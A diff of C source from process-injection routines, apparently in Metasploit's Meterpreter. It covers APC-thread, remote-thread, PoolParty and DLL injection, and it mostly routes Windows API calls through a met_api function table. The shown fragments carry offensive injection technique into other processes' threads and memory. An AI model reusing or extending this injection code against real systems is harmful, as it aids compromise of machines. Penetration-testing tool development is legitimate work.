@@ -247,7 +247,7 @@ DWORD inject_via_apcthread( Remote * remote, Packet * response, HANDLE hProcess,
 			BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: Invalid target architecture" )
 		}
 
-		hNtdll = LoadLibraryA( "ntdll" );
+		hNtdll = met_api->win_api.kernel32.LoadLibraryA( "ntdll" );
 		if( !hNtdll )
 			BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: LoadLibraryA failed" )
 
@@ -255,11 +255,11 @@ DWORD inject_via_apcthread( Remote * remote, Packet * response, HANDLE hProcess,
 		if( !pNtQueueApcThread )
 			BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: GetProcAddress NtQueueApcThread failed" )
 
-		hThreadSnap = CreateToolhelp32Snapshot( TH32CS_SNAPTHREAD, 0 );
+		hThreadSnap = met_api->win_api.kernel32.CreateToolhelp32Snapshot( TH32CS_SNAPTHREAD, 0 );
 		if( !hThreadSnap )
 			BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: CreateToolhelp32Snapshot failed" )
 
-		if( !Thread32First( hThreadSnap, &t ) )
+		if( !met_api->win_api.kernel32.Thread32First( hThreadSnap, &t ) )
 			BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: Thread32First failed" )
 		
 		// Allocate memory for the apc stub and context
@@ -289,7 +289,7 @@ DWORD inject_via_apcthread( Remote * remote, Packet * response, HANDLE hProcess,
 				continue;
 
 			// Open a handle to this thread so we can do the apc injection
-			hThread = OpenThread( THREAD_ALL_ACCESS, FALSE, t.th32ThreadID );
+			hThread = met_api->win_api.kernel32.OpenThread( THREAD_ALL_ACCESS, FALSE, t.th32ThreadID );
 			if( !hThread )
 				continue;
 
@@ -297,7 +297,7 @@ DWORD inject_via_apcthread( Remote * remote, Packet * response, HANDLE hProcess,
 
 			// Only inject into threads we can suspend to avoid synchronization issue whereby the new metsrv will attempt 
 			// a connection back but the client side will not be ready to accept it and we loose the session.
-			if( SuspendThread( hThread ) != (DWORD)-1 )
+			if( met_api->win_api.kernel32.SuspendThread( hThread ) != (DWORD)-1 )
 			{
 				list_push( thread_list, hThread );
 
@@ -316,12 +316,12 @@ DWORD inject_via_apcthread( Remote * remote, Packet * response, HANDLE hProcess,
 			}
 			else
 			{
-				CloseHandle( hThread );
+				met_api->win_api.kernel32.CloseHandle( hThread );
 			}
 			
 			// keep searching for more target threads to inject our apc stub into...
 
-		} while( Thread32Next( hThreadSnap, &t ) );
+		} while( met_api->win_api.kernel32.Thread32Next( hThreadSnap, &t ) );
 
 	} while( 0 );
 
@@ -347,18 +347,18 @@ DWORD inject_via_apcthread( Remote * remote, Packet * response, HANDLE hProcess,
 			HANDLE t = (HANDLE)list_pop( thread_list );
 			if( !t )
 				break;
-			ResumeThread( t );
-			CloseHandle( t );
+			met_api->win_api.kernel32.ResumeThread( t );
+			met_api->win_api.kernel32.CloseHandle( t );
 		}
 
 		list_destroy( thread_list );
 	}
 
 	if( hThreadSnap )
-		CloseHandle( hThreadSnap );
+		met_api->win_api.kernel32.CloseHandle( hThreadSnap );
 
 	if( hNtdll )
-		FreeLibrary( hNtdll );
+		met_api->win_api.kernel32.FreeLibrary( hNtdll );
 
 	SetLastError( dwResult );
 
@@ -442,10 +442,10 @@ DWORD inject_via_remotethread_wow64( HANDLE hProcess, LPVOID lpStartAddress, LPV
 	} while( 0 );
 
 	if( pExecuteX64 )
-		VirtualFree( pExecuteX64, 0, MEM_DECOMMIT );
+		met_api->win_api.kernel32.VirtualFree( pExecuteX64, 0, MEM_DECOMMIT );
 
 	if( pX64function )
-		VirtualFree( pX64function, 0, MEM_DECOMMIT );
+		met_api->win_api.kernel32.VirtualFree( pX64function, 0, MEM_DECOMMIT );
 
 	return dwResult;
 }
@@ -500,7 +500,7 @@ DWORD inject_via_remotethread(Remote * remote, Packet * response, HANDLE hProces
 
 		dprintf("[INJECT] inject_via_remotethread: Resuming the injected thread...");
 		// Resume the injected thread...
-		if (ResumeThread(hThread) == (DWORD)-1)
+		if (met_api->win_api.kernel32.ResumeThread(hThread) == (DWORD)-1)
 		{
 			BREAK_ON_ERROR("[INJECT] inject_via_remotethread: ResumeThread failed")
 		}
@@ -509,7 +509,7 @@ DWORD inject_via_remotethread(Remote * remote, Packet * response, HANDLE hProces
 
 	if (hThread)
 	{
-		CloseHandle(hThread);
+		met_api->win_api.kernel32.CloseHandle(hThread);
 	}
 
 	SetLastError(dwResult);
@@ -567,7 +567,7 @@ DWORD inject_via_poolparty(Remote* remote, Packet* response, HANDLE hProcess, DW
 		}
 
 		// Duplicate the event handle for the target process
-		if (!DuplicateHandle(GetCurrentProcess(), hTriggerEvent, hProcess, &ctx.e.hTriggerEvent, 0, TRUE, DUPLICATE_SAME_ACCESS))
+		if (!met_api->win_api.kernel32.DuplicateHandle(GetCurrentProcess(), hTriggerEvent, hProcess, &ctx.e.hTriggerEvent, 0, TRUE, DUPLICATE_SAME_ACCESS))
 		{
 			BREAK_ON_ERROR("[INJECT][inject_via_poolparty] DuplicateHandle failed");
 		}
@@ -586,6 +586,7 @@ DWORD inject_via_poolparty(Remote* remote, Packet* response, HANDLE hProcess, DW
 			BREAK_ON_ERROR("[INJECT][inject_via_poolparty] Cannot write poolparty shellcode prologue!");
 		}
 
+		dwResult = ERROR_INVALID_FUNCTION; // Set a default failure
 		for (UINT8 variant = POOLPARTY_TECHNIQUE_TP_DIRECT_INSERTION; variant < POOLPARTY_TECHNIQUE_COUNT; variant++) {
 			if (poolparty->variants[variant].isInjectionSupported) {
 #ifdef DEBUGTRACE
@@ -621,7 +622,7 @@ DWORD inject_via_poolparty(Remote* remote, Packet* response, HANDLE hProcess, DW
 		}
 		SetEvent(hTriggerEvent);
 		SetLastError(dwResult);
-		CloseHandle(hTriggerEvent);
+		met_api->win_api.kernel32.CloseHandle(hTriggerEvent);
 
 	} while (0);
 	return dwResult;
@@ -737,7 +738,7 @@ DWORD inject_dll(DWORD dwPid, DWORD dwDestinationArch, LPVOID lpDllBuffer, DWORD
 	} while (0);
 
 	if (hProcess)
-		CloseHandle(hProcess);
+		met_api->win_api.kernel32.CloseHandle(hProcess);
 
 	return dwResult;
 }
